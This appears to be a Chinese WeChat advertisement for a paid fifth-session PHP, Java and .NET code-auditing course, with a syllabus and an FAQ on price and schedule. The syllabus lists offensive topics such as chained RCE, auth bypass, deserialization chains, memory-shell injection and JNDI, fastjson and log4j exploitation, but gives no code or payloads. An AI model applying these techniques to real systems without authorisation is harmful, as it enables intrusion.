![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kR1cXzukmYcLFKWnO718lUibvDTgdjxMGItN1kk0cqLjzPPBqO1vA18cqht9iaYf827Pk3dcSP3beZqtJx7Fqdp4fMpuJicsaxDck/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=65 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTCGxiaNmCXpl0RO9ibKBuLDgXLRuDXxPocAkibVCtkdEg4eqgqxA7eXnC0ORrsC9anb6BbDjtrx94u5xuA9g1DI4YMsSXztgUKlw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=66 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSE75O3bFA6XOMIzPiaeSmcdhd0vovbfXXTjITe08EYoFTDNGU619ZTgSB9xOoPSk62gGUVMFIHdEicCDvOxC8iaxqIY6OllknL9M/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=67 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQ9UGZQTRbQLlNHYZ3icmrMJFO07A8EZdgpkNfEo19oFT110T5scAgYKBQUaWAIpbNXRrJ1iaVWTNQdicdbNGOnRBfBibMJGosqwVg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=68 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT7V5BibQYTQR7414dpd5yPrtDHkokHXCHoQbPsvVC7xtLicLBDVXjfVGHflUGe6lG7RIp1mXfBh96H7OOdOt0BGNxLDDYX3rGwE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=69 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR3pRtFKKc5Whw688g5bibiaFeIbhYibichqLGmWzC6l6bGiaicANGmBTN3lPseEuPiahics18JibUImQbU0ZdpJF170RRiaLeNic1hUwiaCdc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=70 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTYOKBFj5DRODE14wSkemlXibFKMVVE31R4TBsc3aGpvoc6bDgKiarSJWRYA4Hl3o5cWxP3veia14XfLkY381o8iaQbolk5jklHJ5E/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=71 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRQGSZoSmnn22NicZNy4AEPbh1oOD0g7Pkzno2KqibjB1TMibRcuZQa4geSB20OxpBU9ic5NyfiaVOaDMqHucI2wvEUcSuZtndqjkrs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=72 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQjNiciaiaickWw9OJQnJA3EygRC4U7HOPS7gvlJoye3enHGXJkWvtDIENgiaPmibK4icib1oC7CN7JYTXiclQLktHoCMCIoyru0MqQOJy0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=73 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSQuydN2CmicANiamgG9LXBs6kYcduD0Cv2ic9pMc23XTgibZcR40dAic9z0xWnMzMdKH3zc2KaH1apEXjpl3bPZV6uof69sN9p9sBA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=74 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTbmHnaAapG9R2TPdb4WWRPqDLnLrwPfwo2g8iaenstkpnqGZudpZ8fGkNCiaickTz5aiaviaHOxgajK4I5nK32NITrzB267xNrV45s/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=75 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTBiasYl9FGmxHQywacDRD5sbue3Q12LsQ8N3dFvYaxd4MzicUyoLl5LKICplFRLmDJrehXdUgFHNSibckze8qia3pMvZnh8I98sC0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=76 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQ9IN2WOQsZ1fFLdT3GzjiciclGyibcvlyvRIjNnj5tahsvkHFYIdWIK0D1xn43GicwrfzBZuZ7HnNIPlYQzviayElQXCzl1BzO2auE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=77 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRKkTorvrqPzMWJ8lJuHBjfFSvyXSnFoIEE6s9zGvMbE8bibicCmBictJKNFSlrpu8Nsia7icetWibod6b7JthL5UJyS9XZV5VktTe4g/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=78 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSRF3Be5nwnbkTHzjgs5RhUjfTZj7SXBHrSr1taiaHiahZK4CvJm626BPg0GUK02bicUqz6CzAoVXP3WTuITVNpytfE1ibV6YOAU8o/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=79 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSia1BM8nFsdXSrt2XFHRibZLDwCOYicGdG5v3Yrh00xnOeSia01yv3xia0Rsg9XyFWtTSnxNuwJdBZouaRELqXreib3h9ckhYkGKMBY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=80 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTib50VuZQE02PcfdL53exWmTibxA7ATFpEpdhEibLksjcDDNrvObCG20kH6BsRbg1ibCg8APrLBsFbYiadIviaTf6NTfhAmdEMBDjmk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQkVPB3zAJzwst6sDoa1aicshcr5XpbKH55STBo1FLtoejo53m19ozpvBK2cRX8P7dBowcHozBhdoha4T59xkxukERMV9c69dTQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=82 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kT7jNngn4Kjj6u7OpYjR0BVmE2DCFtfRKSmVdK9xtCwyRmsEsFVPznIEbHcEUaX8Rc5v2FribW8s92UVAuv7gA2L0pb2w90Eq54/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=83 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRApMIAGHabsOdQlSA0wDWocE2WbZibnvLw4s2KovVJTribDNFkRfaibIx1ypYjQw4icyoTXop5R6wrkEwgO4m7lZlVoXIKoa6Kk0Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=84 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSqhPJ31dM9mQbetaPVj5ibGaawtgA66qUdPiaZHzphJooibNiciazbMtu8xicopQQ8IeQODpicm1syNC21Ky5FykJv5NzdiaWqG5RqXvo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=85 "")  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
(其实报喜一个是为了宣传，更重要的其实每当学员来报喜的时候，都有一种成就感，最起码能够认定自己的课程是有一定价值一定性价比的，而且确实收了师傅们的钱，能够帮助到师傅们一些，自己也就更有坚持下去做培训的信心。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=120 "")  
  
二、第五期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=121 "")  
  
  
  
    第五期课程仍然是以代码审计为主，本次课程还是为三个语言的代码审计0-1讲解，目的为帮助学员完成0-1+1的白盒（代码审计）漏洞挖掘，并且在出货的基础上再+1去出高质量的漏洞（  
例如组合拳RCE、前台相关漏洞等）。  
  
  
1  
  
开课时间&课程周期  
  
开课时间暂定为：2026年4月3日  
  
开课周期预计到：三个月左右（直播+录播）  
  
**课程大纲**  
  
    本次课程分为PHP、JAVA、NET代码审计为直播+录播，为了照顾一些基础较为薄弱的师傅新增基础~技巧~番外（录播课程）。  
  
  
01  
  
PHP&JAVA&NET代码审计 (直播+录播)  
  
     
  
    之前课程大纲主要为xxx实战案例，本次课程大纲着重体现思路方向，并非取消了实战部分，实战部分之多不减。  
  
PHP课程目录  
  
  
✅   
   
第一节课：多框架初识&路由认识&参数传递  
  
✅   
   
第二节课：多框架&鉴权分析&认证与鉴权&鉴权方式  
  
✅   
   
第三节课：多框架&常见漏洞函数&回显&非回显  
  
✅   
   
第四节课：注入漏洞&常见位置&实战审计注入类漏洞  
  
✅   
   
第五节课：前台RCE漏洞审计&漏洞案例技巧讲解  
  
✅   
   
第六节课：门户网站CMS&网络设备&审计经验讲解  
  
✅   
   
第七节课：多框架&鉴权对抗&权限绕过技巧&案例分析  
  
✅   
   
第八节课：组合拳RCE漏洞分析&漏洞组合拳利用&案例  
  
✅   
   
第九节课：PHP下反序列化漏洞&魔术方法&pop链分析  
  
✅   
   
第十节课：PHP下反序列化漏洞实战&phar协议RCE案例  
  
  
JAVA课程目录  
  
  
✅   
   
第一节课：Servlet&Spring Boot&Spring MVC&Struts2  
  
✅   
   
第二节课：多框架下&拦截器&认证鉴权&组件鉴权分析  
  
✅   
   
第三节课：多框架下&权限绕过&鉴权对抗&案例分析  
  
✅   
   
第四节课：常见漏洞函数&案例分析&审计技巧  
  
✅   
   
第五节课：前台漏洞审计&组合拳rce漏洞&技巧&案例  
  
✅   
   
第六节课：反序列化&CC链利用&反序列化漏洞利用  
  
✅   
   
第七节课：  
Ognl&SpEl&EL表达式注入&漏洞案例  
  
✅   
   
第八节课：内存马简介&内存马原理分析&内存马注入方式  
  
✅   
   
第九节课：RMI&JNDI注入&JNDI注入漏洞利用&案例  
  
✅   
   
第十节课：组件漏洞&shiro&fastjson&log4j分析&利用  
  
  
.NET课程目录  
  
  
✅   
   
第一节课：初识.NET&Web From & MVC架构框架分析  
  
✅   
   
第二节课：Web From&MVC框架&鉴权分析&认证方式  
  
✅   
   
第三节课：多框架下&鉴权对抗&权限绕过分析&案例  
  
✅   
   
第四节课：注入漏洞分析&文件操作类漏洞&实战分析  
  
✅   
   
第五节课：常见漏洞位置&前台漏洞审计&漏洞案例讲解  
  
✅   
   
第六节课：组合拳RCE漏洞分析&组合拳RCE案例讲解  
  
✅    
第七节课：.NET反序列化漏洞初识&反序列化漏洞原理  
  
✅    
第八节课：.NET安全反序列化链&反序列化触发场景  
  
✅    
第九节课：.NET反序列化漏洞案例&反序列化漏洞分析  
  
  
02  
  
基础~技巧~番外（录播)  
  
  
该篇章为长期更新  
  
  
1  
  
基础篇章  
  
1、  
由于之前上课时部分师傅存在一定基础，刚开始的课程部分师傅认为自己可以跟的上等问题，导致时间的浪费。  
  
  
2、  
同时有一定的师傅存在无法搭建源码，以及软件下载等问题，于是将这种基础问题，统一归纳为基础篇章，供师傅们学习，节省师傅们时间提升学习效率及课程质量  
  
  
3、同时面对部分学员频繁提出的一些问题，针对该问题同样会进行解答，并且进行录制上传至基础篇章中。  
  
  
2  
  
技巧篇章  
  
1、  
随着自己技术的进步也了解到了一些新型的技巧或者手法，例如sql注入的某一个技巧，但是重新讲解又浪费大量时间，特地新增了技巧篇章，将单独的技巧进行讲解  
。  
  
  
3  
  
番外篇章  
  
1、自己在第四期讲过一些逆向相关，并且还存在相关的一些好的案例，得到了挺多师傅的认可，例如某APP接管存储桶等案例，于是之后在有好的案例将进行上传更新。  
  
**课程思维导图**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTW2VkKRXr1G8r9PReibfyINMgT0ZbKSMjndZ84uYKrsIlHCXjs5kQllcQHsDvia4Cw5iaNibNqicYd4bQjQjMDqh3hKe7HPQKtDTNc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=122 "")  
  
  
**常见疑问&课程讲解**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=123 "")  
  
第五期课程  
收费多少？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=124 "")  
  
本次课程收费仍然是  
1688，并且还是承诺一次报名后续不再进行任何二次收费保障（包含  
内部平台，  
以及后续推出一系列内容均可观看）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=125 "")  
  
什么时间段上课，上课周期是多长时间？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=126 "")  
  
第五期课程【直播+录播】上课周期为  
三个月，一般集中在  
周五六日这三天，一周保持  
2～3节课，每节课  
1小时左右。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=127 "")  
  
作为学员，我们都有哪些权益？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=128 "")  
  
首先最关键的就是  
课程内容是可以一直学习的，同时  
内部报告平台也可进行观看，  
答疑是不限时长，不限类型方向，任何方向均可，再次同时代码审计最关键的就是源码，  
源码&课件&视频都是给兄弟们配套的，当然无聊找小朋友聊天一起打游戏也可以哦。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=129 "")  
  
学完之后可以达到什么水平？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=130 "")  
  
学完之后可以达到可以进行  
独立审计的水平，在面对  
php、JAVA、NET主流语言的源码，可以进行  
独立审计，  
验证漏洞，对于一些  
JAVA安全内容例如：  
反序列化，内存马等也有一定的理解，可以进行打  
反序列化漏洞、  
注入内存马等操作，同时  
PHP的反序列化、pop链，phar协议等利用也有一定理解，且此类漏洞导致RCE  
均有案例。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=131 "")  
  
0基础可以学吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=132 "")  
  
1、这是大家最常问的一个问题，  
0基础是可以的，我的代码审计课程一直秉持着  
帮助大家完成代码审计0-1的目标，同时往期（第四期）课程新增了进阶课，其目的也是帮助大家完成  
0-1出洞到0-1出有质量的漏洞。  
  
  
2、另外考虑到有的  
学员基础较为薄弱，本期同时也开了  
番外篇&基础篇，师傅们可以观看这块分区课程内容，此类分块课程目的就是为  
协助到一些基础比较薄弱的师傅们。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=133 "")  
  
是那种读PPT拿着靶场讲解吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=134 "")  
  
不会，课程均使用一些  
0Day&1Day&Nday优质漏洞来进行授课，且本期案例均为从  
简-难漏洞案例，深度体验代码审计当中的  
难易区分，  
完全杜绝靶场以及去读PPT的，从培训第一期开始到现在，基本为上课开始看几眼课件，  
让学员熟悉这节课的大概内容等信息，然后  
直接实操到下课，这一点也是  
我干培训五期以来一直使用的授课方式。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=135 "")  
  
是否有简历修改&内推等福利？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=136 "")  
  
有的兄弟，有的，  
不介意小朋友的指导简历这类的话，随时欢迎大家来骚扰我。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=137 "")  
  
为什么你不新增AI方向的内容？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=138 "")  
  
目前我个人认为AI可以帮助我们  
提升很大的效率，但是前提是  
AI的使用者本身要懂这个技术，才可以利用AI来  
降低该技术门槛，提升效率，  
完全自动化目前感觉还是无法做到，包括  
课程当中也会使用AI会顺带着给师傅讲了  
如何用ai来提升效率，同时如果反馈不会使用的师傅较多，会考虑后续在基础～技巧～番外来更新该方向内容。  
  
  
**联系方式**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQEALGIPjEF5U7o5nuuHic9qpolOGo5hN0QdqYFm5msDUITNiaUCpib4fFt3lNaVX2yWtaJldy01yu9UY8bibBZXstrrd5Cqygkldw/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
